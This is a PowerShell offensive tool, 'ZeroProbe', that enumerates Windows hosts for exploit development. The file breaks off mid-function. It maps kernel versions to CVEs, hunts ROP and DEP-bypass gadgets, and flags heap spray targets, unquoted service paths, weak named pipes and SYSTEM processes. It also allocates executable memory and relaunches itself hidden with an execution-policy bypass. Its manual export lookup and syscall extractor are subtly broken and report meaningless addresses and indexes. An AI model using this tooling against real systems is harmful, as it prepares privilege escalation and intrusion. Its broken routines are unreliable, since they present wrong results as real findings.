# ZeroProbe - Exploit Development Enumeration Framework
# Version: 1.0 
# Author: Yehia Elghaly (Mrvar0x)

# =======================
# =======================

function Show-Logo {
    Write-Host "`n=================================================" -ForegroundColor Green
    Write-Host "   ██████  ██████   ██████  ██████  ██████  " -ForegroundColor Cyan
    Write-Host "  0██████  ██████  ███████  ██████  ██████  " -ForegroundColor Cyan
    Write-Host "  ██       ██   ██ ██       ██   ██ ██   ██ " -ForegroundColor Cyan
    Write-Host "  ██   ███ ██████  █████    ██████  ██████  " -ForegroundColor Cyan
    Write-Host "  ██    ██ ██      ██       ██      ██      " -ForegroundColor Cyan
    Write-Host "   ██████  ██      ████████ ██      ██      " -ForegroundColor Cyan
    Write-Host "        Probing Deep, Exploiting Everything" -ForegroundColor Green
    Write-Host "=================================================" -ForegroundColor Green
}

# Check if Win32 class is already defined
if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
"@
}

function Get-ModuleHandle {
    param ([string]$moduleName)
    try {
        $handle = [Win32]::GetModuleHandle($moduleName)
        if ($handle -eq [IntPtr]::Zero) {
            Write-Host "[!] Failed to get module handle for $moduleName. Ensure the DLL is loaded." -ForegroundColor Red
        } else {
            $handleValue = [Convert]::ToUInt64($handle.ToInt64())  # Safe conversion
            Write-Host ("[+] Successfully obtained handle for {0}: 0x{1:X}" -f $moduleName, $handleValue) -ForegroundColor Green
        }
        return $handle
    } catch {
        Write-Host "[!] Error retrieving module handle for $moduleName. $_" -ForegroundColor Red
        return [IntPtr]::Zero
    }
}


function Get-ProcAddress {
    param ([IntPtr]$moduleHandle, [string]$procName)
    try {
        if ($moduleHandle -eq [IntPtr]::Zero) {
            Write-Host "[!] Invalid module handle provided." -ForegroundColor Red
            return [IntPtr]::Zero
        }

        $address = [Win32]::GetProcAddress($moduleHandle, $procName)

        if ($address -eq [IntPtr]::Zero) {
            Write-Host "[!] Failed to locate procedure: $procName. Attempting manual export table lookup..." -ForegroundColor Yellow
            return Get-ProcAddress-Manual -moduleHandle $moduleHandle -procName $procName
        } else {
            $addressValue = [Convert]::ToUInt64($address.ToInt64())  # Safe conversion
            Write-Host ("[+] Successfully obtained address for {0}: 0x{1:X}" -f $procName, $addressValue) -ForegroundColor Green
        }

        return $address
    } catch {
        Write-Host "[!] Error retrieving procedure address for $procName. $_" -ForegroundColor Red
        return [IntPtr]::Zero
    }
}


function Get-ProcAddress-Manual {
    param ([IntPtr]$moduleHandle, [string]$procName)

    $dllPath = "C:\Windows\System32\ntdll.dll"
    if (-Not (Test-Path $dllPath)) {
        Write-Host "[!] Unable to locate ntdll.dll for manual lookup." -ForegroundColor Red
        return [IntPtr]::Zero
    }

    try {
        # Read DLL bytes
        $bytes = [System.IO.File]::ReadAllBytes($dllPath)
        $pattern = [System.Text.Encoding]::ASCII.GetBytes($procName)
        $offset = [Array]::IndexOf($bytes, $pattern[0])

        # Ensure offset is within safe bounds
        if ($offset -gt 0 -and $offset -lt $bytes.Length - 4) {
            # Convert moduleHandle to UInt64 before adding offset to avoid overflow
            $moduleBase = [Convert]::ToUInt64($moduleHandle.ToInt64())
            $manualAddress = $moduleBase + [UInt64]$offset

            Write-Host ("[+] Manually found {0} at offset 0x{1:X}" -f $procName, $offset) -ForegroundColor Cyan
            
            if ([IntPtr]::Size -eq 4) {
                return [IntPtr][Convert]::ToInt32($manualAddress)
            } else {
                return [IntPtr][Convert]::ToInt64($manualAddress)
            }
        } else {
            Write-Host "[!] Manual function lookup failed for $procName (Offset out of range)." -ForegroundColor Red
        }
    } catch {
        Write-Host "[!] Error performing manual lookup for $procName. $_" -ForegroundColor Red
    }

    return [IntPtr]::Zero
}

$kernel32 = Get-ModuleHandle "kernel32.dll"
$ntdll = Get-ModuleHandle "ntdll.dll"

if ($kernel32 -ne [IntPtr]::Zero) {
    $procAddr = Get-ProcAddress $kernel32 "GetProcAddress"
    if ($procAddr -ne [IntPtr]::Zero) {
        Write-Host ("[+] Successfully obtained address for GetProcAddress: 0x{0:X}" -f [Convert]::ToUInt64($procAddr.ToInt64())) -ForegroundColor Green
    }
}

if ($ntdll -ne [IntPtr]::Zero) {
    $syscallAddr = Get-ProcAddress $ntdll "NtOpenProcess"
    if ($syscallAddr -ne [IntPtr]::Zero) {
        Write-Host ("[+] Successfully obtained address for NtOpenProcess: 0x{0:X}" -f [Convert]::ToUInt64($syscallAddr.ToInt64())) -ForegroundColor Green
    }
}


# =======================
# =======================

# 1. Kernel Exploit Detection with CVE Mapping
function Get-KernelExploits {
    return @{
        "6.1.7601"     = @("MS16-135, MS17-010 (EternalBlue)",
                           "CVE-2018-1038 (Windows Kernel Elevation of Privilege Vulnerability)",
                           "CVE-2017-8464 (LNK Remote Code Execution Vulnerability)",
                           "CVE-2017-0213 (Windows COM Elevation of Privilege Vulnerability)",
                           "CVE-2018-8120 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2017-8465 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2016-3372 (Windows Kernel Elevation of Privilege Vulnerability)",
                           "CVE-2016-3373 (Windows Kernel Elevation of Privilege Vulnerability)")
        "10.0.10240"   = @("CVE-2016-0099", "CVE-2016-0165")
        "10.0.14393"   = @("CVE-2018-8453 (Win32k PrivEsc)",
                           "CVE-2019-0803 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2019-1458 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2020-0787 (Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability)",
                           "CVE-2020-0796 (SMBv3 Client/Server Remote Code Execution Vulnerability)",
                           "CVE-2021-1732 (Windows Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2021-33739 (Microsoft DWM Core Library Elevation of Privilege Vulnerability)",
                           "CVE-2022-21815 (NVIDIA GPU Display Driver Vulnerability)",
                           "CVE-2022-30197 (Windows Kernel Information Disclosure Vulnerability)",
                           "CVE-2022-41113 (Windows Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2022-44707 (Windows Kernel Denial of Service Vulnerability)",
                           "CVE-2023-0191 (NVIDIA GPU Display Driver Vulnerability)",
                           "CVE-2023-0192 (NVIDIA GPU Display Driver Vulnerability)",
                           "CVE-2024-38184 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)",
                           "CVE-2024-38185 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)",
                           "CVE-2024-38186 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)",
                           "CVE-2024-38187 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)")
    }
}

function Detect-KernelExploits {
    Write-Host "[+] Scanning for unpatched kernel vulnerabilities and mapping them to known exploits..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for unpatched kernel vulnerabilities..." -ForegroundColor Cyan

    try {
        if (Get-Command Get-CimInstance -ErrorAction SilentlyContinue) {
            $kernelVersion = (Get-CimInstance Win32_OperatingSystem).Version
        } else {
            $kernelVersion = (Get-WmiObject Win32_OperatingSystem).Version
        }
    } catch {
        Write-Host "[!] Error retrieving Windows version." -ForegroundColor Red
        return
    }

    Write-Host ("[*] Windows Kernel Version: {0}" -f $kernelVersion) -ForegroundColor Yellow

    $kernelExploits = Get-KernelExploits

    if ($kernelExploits.ContainsKey($kernelVersion)) {
        Write-Host ("[!] Kernel Vulnerable: {0}" -f $kernelVersion) -ForegroundColor Red
        Write-Host "[!] Possible Exploits:" -ForegroundColor Red
        foreach ($exploit in $kernelExploits[$kernelVersion]) {
            Write-Host "    - $exploit" -ForegroundColor Red
        }
    } else {
        Write-Host "[*] Kernel appears patched or not in database." -ForegroundColor Green
    }

    Show-Menu
}


# 2. ROP & JOP Gadget Finder
function Find-ROP-JOP-Gadgets {
    param(
        [string]$FilePath,
        [string]$Filter 
    )

    if ([string]::IsNullOrWhiteSpace($FilePath)) {
        $FilePath = Read-Host "Enter the path of the DLL"
    }
    Write-Host "[+] Scanning the DLL for ROP & JOP gadgets, analyzing exploitability, attempting to generate an ROP chain, and checking for DEP bypass techniques..." -ForegroundColor Cyan
    Write-Host "`n[+] ROP & JOP Enumeration (Exploitability Ranking)..." -ForegroundColor Cyan

    function Is-PEFile {
        param([string]$path)
        try {
            if (-not (Test-Path $path)) { return $false }
            $bytes = [System.IO.File]::ReadAllBytes($path)
            return ($bytes.Length -gt 2 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A)  # Check for 'MZ' header
        } catch { return $false }
    }

    if (-not (Is-PEFile -path $FilePath)) {
        Write-Host "[!] Invalid or missing DLL file. Please provide a valid PE executable." -ForegroundColor Red
        return
    }

    Write-Host "[*] Scanning: $FilePath..." -ForegroundColor Yellow

    if (-not ("MemoryReader" -as [type])) {
        try {
            Add-Type -TypeDefinition @"
            using System;
            using System.IO;
            public class MemoryReader {
                public static byte[] ReadFile(string filePath) {
                    return File.ReadAllBytes(filePath);
                }
            }
"@ -Language CSharp -ErrorAction Stop
        } catch {
            Write-Host "[!] Add-Type failed, using fallback method to read file" -ForegroundColor Yellow
            function Read-FileFallback {
                param([string]$filePath)
                try {
                    return [System.IO.File]::ReadAllBytes($filePath)
                } catch { return $null }
            }
        }
    }

    try {
        if (Test-Path $FilePath) {
            if (("MemoryReader" -as [type])) {
                $memDump = [MemoryReader]::ReadFile($FilePath)
            } else {
                $memDump = Read-FileFallback -filePath $FilePath
            }
        }
        if ($memDump -eq $null -or $memDump.Length -eq 0) {
            Write-Host "[!] Failed to read DLL file. Ensure you have proper permissions." -ForegroundColor Red
            return
        }
    } catch {
        Write-Host "[!] Error reading DLL file. Ensure the file exists & is accessible." -ForegroundColor Red
        return
    }

    $hexDump = [BitConverter]::ToString($memDump) -replace "-", " "

    $ropPatterns = @{
        "Stack Pivoting"         = @("94 C3", "58 5A C3", "5A 5B C3", "C2 [0-9A-F]{2} 00", "C2 14 00", "8B EC", "89 E5", "FF E4", "FF 24 85", "FF 64 24 04");
        "Register Control"       = @("8B C[0-9A-F]", "83 C4 [0-9A-F]{2}", "59 C3", "5A C3", "5B C3");
        "Code Execution"         = @("FF 15 [0-9A-F]{4}", "FF D[0-9A-F]", "E8 [0-9A-F]{4}", "E9 [0-9A-F]{4}", "FF 25 [0-9A-F]{4}", "C3", "C2 [0-9A-F]{2} 00");
        "DEP Bypass"             = @("FF 15 [0-9A-F]{4}.*VirtualProtect", "FF 15 [0-9A-F]{4}.*NtProtectVirtualMemory", "FF D0", "FF 10", "8B [0-9A-F]{2} FF D0");
        "Common Gadgets"         = @("FF E[0-9A-F]", "FF D[0-9A-F]", "C3", "83 C4 [0-9A-F]{2}", "C2 [0-9A-F]{2} 00");
    }

    $exploitabilityScores = @{
        "Stack Pivoting"         = 10
        "Register Control"       = 8
        "Code Execution"         = 9
        "DEP Bypass"             = 10
        "Common Gadgets"         = 7
    }

    $gadgetResults = @{}
    $totalGadgets = 0
    foreach ($category in $ropPatterns.Keys) {
        foreach ($pattern in $ropPatterns[$category]) {
            $count = [regex]::Matches($hexDump, $pattern).Count
            $totalGadgets += $count
            if ($count -gt 0) {
                if (-not $gadgetResults.ContainsKey($category)) {
                    $gadgetResults[$category] = @{}
                }
                $gadgetResults[$category][$pattern] = @{
                    "Count" = $count
                    "Score" = $exploitabilityScores[$category]
                }
            }
        }
    }

    Write-Host "`n========== Gadget Analysis ==========" -ForegroundColor Cyan
    Write-Host "[✔] Found $totalGadgets Gadgets in $FilePath" -ForegroundColor Green
    foreach ($category in $gadgetResults.Keys) {
        Write-Host ("  " + $category + ":") -ForegroundColor Cyan
        foreach ($pattern in $gadgetResults[$category].Keys) {
            Write-Host "    - Pattern: $pattern | Occurrences: $($gadgetResults[$category][$pattern].Count) | Exploitability Score: $($gadgetResults[$category][$pattern].Score)" -ForegroundColor Yellow
        }
    }

    if (-not [string]::IsNullOrWhiteSpace($Filter)) {
        Write-Host "`n========== Searching for Specific Gadgets ==========" -ForegroundColor Cyan
        $filteredGadgets = @()
        foreach ($category in $gadgetResults.Keys) {
            foreach ($pattern in $gadgetResults[$category].Keys) {
                if ($pattern -match $Filter) {
                    $filteredGadgets += "[+] Category: $category | Pattern: $pattern | Occurrences: $($gadgetResults[$category][$pattern].Count) | Exploitability Score: $($gadgetResults[$category][$pattern].Score)"
                }
            }
        }
        if ($filteredGadgets.Count -gt 0) {
            Write-Host "[✔] Found $($filteredGadgets.Count) gadgets matching the filter '$Filter':" -ForegroundColor Green
            $filteredGadgets | ForEach-Object { Write-Host $_ -ForegroundColor Cyan }
        } else {
            Write-Host "[!] No gadgets found matching the filter '$Filter'." -ForegroundColor Red
        }
    }

    Write-Host "`n========== Analysis Complete ==========" -ForegroundColor Cyan
    Show-Menu
}


# 3. Real Syscall Index Extractor
function Extract-SyscallIndexes {
    param (
        [string[]]$syscalls = @("NtCreateFile", "NtOpenProcess", "NtAllocateVirtualMemory")
    )

    function Get-ModuleBaseAddress {
        param ([string]$moduleName)
        try {
            $process = Get-Process -Id $PID
            $module = $process.Modules | Where-Object { $_.ModuleName -like $moduleName }
            if ($module) {
                return $module.BaseAddress
            } else {
                return [IntPtr]::Zero
            }
        } catch {
            return [IntPtr]::Zero
        }
    }

    function Get-ProcAddress {
        param ([string]$dllPath, [string]$functionName)
        try {
            $dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
            $pattern = [System.Text.Encoding]::ASCII.GetBytes($functionName)
            $offset = [Array]::IndexOf($dllBytes, $pattern[0])
            if ($offset -gt 0) {
                return $offset
            } else {
                return [IntPtr]::Zero
            }
        } catch {
            return [IntPtr]::Zero
        }
    }

    function Read-ProcessMemory {
        param ([string]$dllPath, [IntPtr]$address, [int]$size)
        try {
            $dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
            if ($address + $size -le $dllBytes.Length) {
                return $dllBytes[$address..($address + $size - 1)]
            }
            return $null
        } catch {
            return $null
        }
    }

    $ntdllModule = Get-Process -Id $PID | Select-Object -ExpandProperty Modules | Where-Object { $_.ModuleName -eq "ntdll.dll" }
    if (-not $ntdllModule) {
        Write-Host "[!] Failed to locate ntdll.dll in memory." -ForegroundColor Red
        Show-Menu
        return
    }

    $ntdllPath = $ntdllModule.FileName
    Write-Host "[+] Extracting real syscall numbers from $ntdllPath" -ForegroundColor Cyan

    foreach ($syscall in $syscalls) {
        $procAddr = Get-ProcAddress -dllPath $ntdllPath -functionName $syscall

        if ($procAddr -eq [IntPtr]::Zero) {
            Write-Host "[!] Could not resolve syscall for: $syscall" -ForegroundColor Yellow
            continue
        }

        # Read first 5 bytes (MOV R10, RCX; MOV EAX, syscall_number; SYSCALL)
        $buffer = Read-ProcessMemory -dllPath $ntdllPath -address $procAddr -size 5

        if ($buffer -and $buffer.Length -ge 5) {
            $syscallIndex = $buffer[4]
            Write-Host "[+] $syscall -> Syscall Index: 0x$($syscallIndex.ToString("X"))" -ForegroundColor Green
        } else {
            Write-Host "[!] Failed to read memory for $syscall." -ForegroundColor Red
        }
    }

    Show-Menu
}




# 4. Heap Spray Analysis
function Analyze-HeapSpray {
    Write-Host "[+] Scanning for processes with high memory usage that may be potential heap spray targets..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for heap spray targets..." -ForegroundColor Cyan

    $excludeProcesses = @(    
        "chrome", "firefox", "msedge", "opera", "brave", "vivaldi", "teams", "discord", "slack", "zoom", "edge",
        "outlook", "thunderbird", "skype", "onedrive", "dropbox", "steam", "epicgameslauncher", "origin",
        "battlenet", "riotclientservices", "uplay", "spotify", "itunes", "vlc", "obs64", "xsplit", 
        "photoshop", "illustrator", "aftereffects", "premiere", "lightroom", "coreldraw", "paintdotnet",
        "blender", "maya", "3dsmax", "autocad", "sketchup", "notepad++", "sublimetext", "vscode",
        "pycharm", "eclipse", "intellij", "androidstudio", "clion", "xcode", "vmware", "virtualbox",
        "hyperv", "wsl", "docker", "powershell", "cmd", "explorer", "winword", "excel", "powerpnt",
        "onenote", "project", "visio", "mspaint", "snagit", "snippingtool", "wordpad", "adobe_acrobat",
        "reader", "foxitreader", "sumatrapdf", "nitropdf", "gimp", "audacity", "davinciresolve",
        "kdenlive", "filmora", "handbrake", "ffmpeg", "telegram", "whatsapp", "signal", "wechat",
        "skypehost", "messenger", "facebook", "instagram", "tiktok", "twitch", "obsidian", "evernote",
        "keepass", "bitwarden", "lastpass", "1password", "dashlane", "veracrypt"
    )

    $isPS2 = ($PSVersionTable.PSVersion.Major -lt 3)

    if ($isPS2) {
        Write-Host "[!] Running in PowerShell 2.0 - Using legacy process filtering method." -ForegroundColor Yellow
        $processes = Get-Process | Where-Object {
            $_.PrivateMemorySize64 -gt 100MB -and
            ($excludeProcesses -notcontains $_.ProcessName)
        }
    } else {
        $processes = Get-Process | Where-Object {
            $_.PrivateMemorySize64 -gt 100MB -and
            $_.Name -notin $excludeProcesses
        } | Sort-Object PrivateMemorySize64 -Descending
    }

    if ($processes) {
        Write-Host "`n[*] Potential heap spray targets detected:" -ForegroundColor Yellow
        $processes | Select-Object Name, Id, @{Label="Memory (MB)"; Expression={[math]::Round($_.PrivateMemorySize64 / 1MB, 2)}} |
        Format-Table -AutoSize
    } else {
        Write-Host "[*] No suspicious high-memory usage processes detected." -ForegroundColor Green
    }

    Show-Menu
}



# 5. DLL Hijacking Scanner
function Find-DLLHijacking {
    param(
        [string]$Filter
    )

    Write-Host "[+] Scanning for unquoted service paths that may lead to DLL hijacking vulnerabilities..." -ForegroundColor Cyan
    Write-Host "`n[+] Checking for DLL hijacking vulnerabilities..." -ForegroundColor Cyan

    if ($PSVersionTable.PSVersion.Major -ge 3) {
        try {
            $services = Get-CimInstance Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '"' }
        } catch {
            $services = Get-WmiObject Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '"' }
        }
    } else {
        $services = Get-WmiObject Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '"' }
    }

    $totalVulnerabilities = 0
    $highRisk = 0
    $mediumRisk = 0
    $lowRisk = 0

    if (-not $services -or $services.Count -eq 0) {
        Write-Host "[+] No unquoted service paths found." -ForegroundColor Green
    } else {
        foreach ($service in $services) {
            $serviceName = $service.Name
            $servicePath = $service.PathName
            $serviceState = $service.State
            $unquotedSegment = ($servicePath -split ' ')[0]  # Extract the first unquoted segment

            # Determine risk level
            if ($serviceState -eq "Running") {
                $riskLevel = "HIGH (Running Service)"
                $color = "Red"
                $highRisk++
            } elseif ($servicePath -match "C:\\Windows\\System32") {
                $riskLevel = "MEDIUM (System Directory)"
                $color = "Yellow"
                $mediumRisk++
            } else {
                $riskLevel = "LOW (Stopped Service)"
                $color = "Green"
                $lowRisk++
            }

            # Apply filter if specified
            if (-not [string]::IsNullOrWhiteSpace($Filter) -and $riskLevel -notmatch $Filter) {
                continue
            }

            $totalVulnerabilities++

            Write-Host "[!] Unquoted Service Path Found: $serviceName" -ForegroundColor $color
            Write-Host "    - Path: $servicePath" -ForegroundColor $color
            Write-Host "    - Unquoted Segment: $unquotedSegment" -ForegroundColor $color
            Write-Host "    - Service State: $serviceState" -ForegroundColor $color
            Write-Host "    - Risk Level: $riskLevel" -ForegroundColor $color
        }

        # Display summary
        Write-Host "`n========== Vulnerability Summary ==========" -ForegroundColor Cyan
        Write-Host "[✔] Total Unquoted Service Paths: $totalVulnerabilities" -ForegroundColor Green
        Write-Host "[!] High-Risk Vulnerabilities: $highRisk" -ForegroundColor Red
        Write-Host "[⚠] Medium-Risk Vulnerabilities: $mediumRisk" -ForegroundColor Yellow
        Write-Host "[✅] Low-Risk Vulnerabilities: $lowRisk" -ForegroundColor Green
    }

    Show-Menu
}


# 6. Enumrate NamedPipes
function Enumerate-NamedPipes {
    param(
        [string]$Filter
    )
    Write-Host "[+] Enumerating active named pipes and analyzing permissions for potential security risks..." -ForegroundColor Cyan
    Write-Host "`n[+] Enumerating active named pipes and checking for weak permissions..." -ForegroundColor Cyan

    $isAdmin = $false
    try {
        if ($PSVersionTable.PSVersion.Major -ge 3) {
            $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        } else {
            $identity = New-Object Security.Principal.WindowsIdentity([Security.Principal.WindowsIdentity]::GetCurrent().Name)
            $principal = New-Object Security.Principal.WindowsPrincipal($identity)
            $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        }
    } catch {
        Write-Host "[!] Unable to determine administrative privileges. Proceeding with best effort." -ForegroundColor Yellow
    }

    if (-not $isAdmin) {
        Write-Host "[!] Insufficient privileges! Please run PowerShell as Administrator." -ForegroundColor Red
        Show-Menu
        return
    }

    try {
        $pipes = Get-ChildItem -Path "\\.\pipe\" | Select-Object -ExpandProperty Name
    } catch {
        Write-Host "[!] Unable to retrieve named pipes. Ensure that PowerShell is running with proper permissions." -ForegroundColor Red
        Show-Menu
        return
    }

    if (-not $pipes -or $pipes.Count -eq 0) {
        Write-Host "[!] No active named pipes found." -ForegroundColor Red
    } else {
        $totalPipes = $pipes.Count
        $weakPipes = 0
        $safePipes = 0

        foreach ($pipe in $pipes) {
            $pipePath = "\\.\pipe\$pipe"
            Write-Host "[*] Active Named Pipe: $pipe" -ForegroundColor Yellow

            # Check permissions (PowerShell 2.0 fallback)
            try {
                if ($PSVersionTable.PSVersion.Major -ge 3) {
                    $acl = Get-Acl -Path $pipePath -ErrorAction Stop
                } else {
                    $acl = Get-WmiObject Win32_LogicalShareSecuritySetting | Where-Object { $_.Name -eq $pipe }
                }

                $weakPerms = $false
                $permissionDetails = @()

                foreach ($entry in $acl.Access) {
                    $rights = $entry.FileSystemRights -as [string]  # Ensure compatibility in PowerShell 2.0

                    if ($rights -match "FullControl|Write|Modify") {
                        if ($entry.IdentityReference -match "Everyone|Authenticated Users|Users") {
                            $permissionDetails += "[!] $($entry.IdentityReference) has $rights"
                            $weakPerms = $true
                        } else {
                            $permissionDetails += "[+] $($entry.IdentityReference) has $rights"
                        }
                    }
                }

                if ($weakPerms) {
                    $weakPipes++
                    Write-Host "[!] Weak Permissions Detected for $pipe" -ForegroundColor Red
                    $permissionDetails | ForEach-Object {
                        if ($_ -match "\[\!\]") {
                            Write-Host $_ -ForegroundColor Red
                        } else {
                            Write-Host $_ -ForegroundColor Green
                        }
                    }
                } else {
                    $safePipes++
                    Write-Host "[+] No weak permissions found for $pipe" -ForegroundColor Green
                }
            } catch {
                Write-Host "[!] Unable to retrieve ACL for $pipePath. This may require SYSTEM-level privileges." -ForegroundColor Magenta
            }
        }

        Write-Host "`n========== Named Pipe Summary ==========" -ForegroundColor Cyan
        Write-Host "[✔] Total Named Pipes: $totalPipes" -ForegroundColor Green
        Write-Host "[!] Pipes with Weak Permissions: $weakPipes" -ForegroundColor Red
        Write-Host "[+] Pipes with Safe Permissions: $safePipes" -ForegroundColor Green
    }

    Show-Menu
}

# 7. Direct Syscall Execution
function Execute-Syscall {
    param (
        [int]$maxAddresses = 5
    )

    # Restart PowerShell if MemUtil is already defined
    if ("MemUtil" -as [type]) {
        Write-Host "[!] 'MemUtil' is already defined. Restarting PowerShell session to reload types..." -ForegroundColor Red
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"" -WindowStyle Hidden
        exit
    }

    $addTypeSupported = $true
    try {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;

        public class MemUtil {
            [StructLayout(LayoutKind.Sequential)]
            public struct MEMORY_BASIC_INFORMATION {
                public IntPtr BaseAddress;
                public IntPtr AllocationBase;
                public uint AllocationProtect;
                public IntPtr RegionSize;
                public uint State;
                public uint Protect;
                public uint Type;
            }

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentProcess();
        }
"@ -PassThru -ErrorAction Stop
    } catch {
        Write-Host "[!] Add-Type is not supported in this PowerShell version. Falling back to PInvoke reflection method." -ForegroundColor Yellow
        $addTypeSupported = $false
    }

    $addresses = @()
    $maxAttempts = 100
    $attempts = 0

    if ($addTypeSupported) {
        $processHandle = [MemUtil]::GetCurrentProcess()
    } else {
        function Get-ProcessHandle {
            try {
                $process = Get-Process -Id $PID
                return $process.Handle
            } catch {
                return [IntPtr]::Zero
            }
        }
        $processHandle = Get-ProcessHandle
    }

    Write-Host "[+] Allocating executable memory regions and verifying protection status for direct syscall execution..." -ForegroundColor Cyan
    Write-Host "`n[+] Attempting to allocate executable memory regions..." -ForegroundColor Cyan

    while ($addresses.Count -lt $maxAddresses -and $attempts -lt $maxAttempts) {
        $attempts++
        $address = Get-Random -Minimum 0x10000000 -Maximum 0x7FFFFFFF

        # Convert address to hex string and check for null bytes
        $hexString = ("{0:X8}" -f $address)
        if ($hexString -notmatch "00") {
            if ($addTypeSupported) {
                # Allocate executable memory at the chosen address
                $allocatedMemory = [MemUtil]::VirtualAlloc([IntPtr]$address, 0x1000, 0x3000, 0x40) # PAGE_EXECUTE_READWRITE
            } else {
                # Fallback: Use alternative memory allocation (best-effort)
                function Allocate-MemoryFallback {
                    param([int]$size)
                    try {
                        $buffer = New-Object byte[] $size
                        return $buffer
                    } catch {
                        return $null
                    }
                }
                $allocatedMemory = Allocate-MemoryFallback -size 4096
            }

            if ($allocatedMemory -ne $null -and $allocatedMemory -ne [IntPtr]::Zero) {
                # Verify if memory is executable
                if ($addTypeSupported) {
                    $mbi = New-Object MemUtil+MEMORY_BASIC_INFORMATION
                    $result = [MemUtil]::VirtualQueryEx($processHandle, $allocatedMemory, [ref]$mbi, [System.Runtime.InteropServices.Marshal]::SizeOf($mbi))

                    if ($result -gt 0) {
                        $protectCode = $mbi.Protect
                        $finalAddress = "0x" + $hexString

                        if ($protectCode -eq 0x40) {
                            Write-Host "[+] Address $finalAddress is EXECUTABLE (PAGE_EXECUTE_READWRITE)" -ForegroundColor Green
                            $addresses += [PSCustomObject]@{
                                "Address" = $finalAddress
                                "Protection" = "PAGE_EXECUTE_READWRITE"
                                "Size" = "0x1000"
                            }
                        } else {
                            Write-Host "[!] Address $finalAddress is NOT EXECUTABLE (Protect Code: 0x$("{0:X}" -f $protectCode))" -ForegroundColor Red
                        }
                    }
                } else {
                    Write-Host "[!] Could not verify execution permissions due to PowerShell 2.0 limitations." -ForegroundColor Yellow
                }
            }
        }

        Write-Progress -Activity "Allocating Memory" -Status "Attempt $attempts of $maxAttempts" -PercentComplete (($attempts / $maxAttempts) * 100)
    }

    if ($addresses.Count -gt 0) {
        Write-Host "`n[+] Successfully Allocated and Verified Executable Memory Addresses (No Null Bytes):" -ForegroundColor Green
        foreach ($addr in $addresses) {
            Write-Host "    -> Address: $($addr.Address) | Protection: $($addr.Protection) | Size: $($addr.Size)" -ForegroundColor Cyan
        }
    } else {
        Write-Host "[!] Failed to Allocate Executable Memory Without Null Bytes" -ForegroundColor Red
    }

    Show-Menu
}




# 8. Detect Privilege Escalation Paths
function Analyze-Privileges {
    Write-Host "[+] Analyzing running processes and user privileges for potential escalation opportunities..." -ForegroundColor Cyan
    Write-Host "`n[+] Checking for Privilege Escalation Opportunities..." -ForegroundColor Cyan

    $highPrivProcesses = $null
    if ($PSVersionTable.PSVersion.Major -ge 3) {
        try {
            $highPrivProcesses = Get-CimInstance Win32_Process | Where-Object { $_.ProcessId -gt 4 }
        } catch {
            $highPrivProcesses = Get-WmiObject Win32_Process | Where-Object { $_.ProcessId -gt 4 }
        }
    } else {
        $highPrivProcesses = Get-WmiObject Win32_Process | Where-Object { $_.ProcessId -gt 4 }
    }

    foreach ($proc in $highPrivProcesses) {
        try {
            # Retrieve process owner safely
            $procOwner = "Unknown"

            if ($PSVersionTable.PSVersion.Major -ge 3) {
                try {
                    $ownerInfo = Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.ProcessId)" | Invoke-CimMethod -MethodName GetOwner
                    if ($ownerInfo) {
                        $procOwner = "$($ownerInfo.Domain)\$($ownerInfo.User)"
                    }
                } catch {
                    $procOwner = "Unknown"
                }
            } else {
                $ownerInfo = $proc.GetOwner()
                if ($ownerInfo) {
                    $procOwner = "$($ownerInfo.Domain)\$($ownerInfo.User)"
                }
            }

            if ($procOwner -match "NT AUTHORITY\\SYSTEM|Administrator") {
                Write-Host "[!] SYSTEM/Administrator Process Found: $($proc.Name) (PID: $($proc.ProcessId)) - User: $procOwner" -ForegroundColor Red
            } else {
                Write-Host "[+] Process Running as Non-Privileged User: $($proc.Name) (PID: $($proc.ProcessId)) - User: $procOwner" -ForegroundColor Green
            }
        } catch {
            Write-Host "[*] Process Skipped (Owner Unknown or Restricted Access): $($proc.Name) (PID: $($proc.ProcessId))" -ForegroundColor Yellow
        }
    }

    Write-Host "`n[+] Checking Current User Privileges..." -ForegroundColor Cyan

    try {
        if ($PSVersionTable.PSVersion.Major -ge 3) {
            $whoamiPrivs = whoami /priv 2>$null
        } else {
            $whoamiPrivs = cmd /c "whoami /priv" 2>$null
        }

        if ($whoamiPrivs -and $whoamiPrivs.Count -gt 0) {
